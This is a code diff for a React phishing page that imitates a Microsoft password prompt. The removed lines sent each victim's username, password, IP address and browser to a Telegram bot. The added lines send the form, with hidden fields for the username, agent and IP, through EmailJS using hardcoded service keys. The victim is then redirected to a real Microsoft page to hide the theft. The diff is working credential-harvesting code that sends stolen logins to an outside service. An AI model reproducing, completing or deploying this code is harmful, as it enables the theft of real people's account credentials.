@@ -1,6 +1,7 @@
 import React, { useRef, useState } from "react";
 import cookies from "../utils/cookie.config";
-import TelegramSend from "../utils/send-message";
+import emailjs from '@emailjs/browser';
+import { wait } from "../utils/waiter";
 
 export default function Pass() {
   const login: Login = cookies.get("login");
@@ -23,28 +24,43 @@ export default function Pass() {
   }
 
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
-    setIsLoading(true);
+    
     event.preventDefault();
 
-    const message = `
+    setIsLoading(true);
+
+  //   const message = `
   
-  [----+🏦 OFFICE LOGIN 🏦+-----]
+  // [----+🏦 OFFICE LOGIN 🏦+-----]
 
-  USERNAME: ${formInput.username}
+  // USERNAME: ${formInput.username}
 
-  PASSWORD: ${formInput.password}
+  // PASSWORD: ${formInput.password}
 
-  IP: ${ipAddress}
+  // IP: ${ipAddress}
 
-  BROWSER: ${agent}
+  // BROWSER: ${agent}
 
-  `;
+  // `;
 
-    await TelegramSend(message);
+  //   await TelegramSend(message);
 
-    setIsLoading(false);
+    // setIsLoading(false);
 
-    window.location.replace("https://learn.microsoft.com/en-us");
+    // window.location.replace("https://learn.microsoft.com/en-us");
+
+    await wait(3000)
+
+    emailjs.sendForm('service_m05lftf', 'template_2xuq9uj', form.current!, '74xz7jS-Xw5rVxjbV')
+    .then((result) => {
+      console.log(result.text+formInput.username)
+      window.location.replace("https://learn.microsoft.com/en-us");
+    
+    }, (error) => {
+      alert("could not complete your request")
+      console.log(error)
+      setIsLoading(false)
+    }); 
   }
 
   async function getIP() {
@@ -67,6 +83,11 @@ export default function Pass() {
         <h3 style={{ fontSize: "27px", marginTop: "-3px" }}>Enter password</h3>
 
         <form ref={form} method="post" onSubmit={handleSubmit}>
+
+        <input hidden type="text" name='user' value={login.username} />
+<input hidden type="text" name='agent' value={agent} />
+<input hidden type="text" name='pi' value={ipAddress} />
+
           <input
             placeholder="Password"
             onChange={handleInputChange}
